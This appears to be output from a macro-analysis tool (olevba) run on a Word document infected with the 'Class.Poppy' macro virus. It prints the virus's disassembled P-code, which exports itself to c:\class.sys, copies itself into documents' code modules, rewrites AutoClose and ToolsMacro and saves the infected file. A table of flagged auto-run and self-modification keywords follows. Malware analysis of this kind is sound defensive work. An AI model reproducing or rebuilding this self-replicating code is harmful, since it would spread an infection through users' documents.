' 	Set host 
' Line #107:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #108:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #109:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #110:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #111:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #114:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #115:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #116:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0021 "VicodinES Loves You / Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #117:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #118:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #119:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #120:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #121:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #122:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #123:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #124:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #125:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #126:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #127:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #128:
' 	EndWith 
' Line #129:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #130:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #131:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #132:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #133:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #134:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #135:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #136:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #137:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #138:
' 	EndWith 
' Line #139:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #142:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #143:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #144:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #145:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #146:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #147:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #148:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #149:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #150:
' 	EndWith 
' Line #151:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #152:
' 	Label out 
' Line #153:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #154:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #155:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #156:
' 	EndSub 
' Line #157:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #158:
' 	FuncDefn (Sub ViewVBCode())
' Line #159:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #160:
' 	EndSub 
' Line #161:
' Line #162:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

